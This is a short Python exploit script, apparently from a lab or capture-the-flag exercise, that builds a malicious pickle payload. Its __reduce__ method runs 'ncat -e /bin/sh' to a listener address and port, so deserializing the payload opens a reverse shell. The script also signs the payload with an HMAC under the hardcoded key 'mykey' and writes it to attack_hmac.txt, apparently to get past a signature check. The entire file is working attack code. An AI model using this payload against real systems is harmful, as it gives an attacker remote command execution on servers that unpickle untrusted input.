#!/usr/bin/python3

import pickle
import base64
import os
import sys
import hmac
import hashlib


lhost = "127.0.0.0"
lport = "9000"

class REVSHELL(object):
    def __reduce__(self):
        return (os.system, (f"ncat -e /bin/sh -nv {lhost} {lport} ",))
    

serialPayload = pickle.dumps(REVSHELL())
#payload = base64.b64encode(serialPayload)

digest = hmac.new(b'mykey', serialPayload, hashlib.sha256).digest()

with open("attack_hmac.txt", "wb") as file:
    file.write(digest + b' ' + serialPayload)

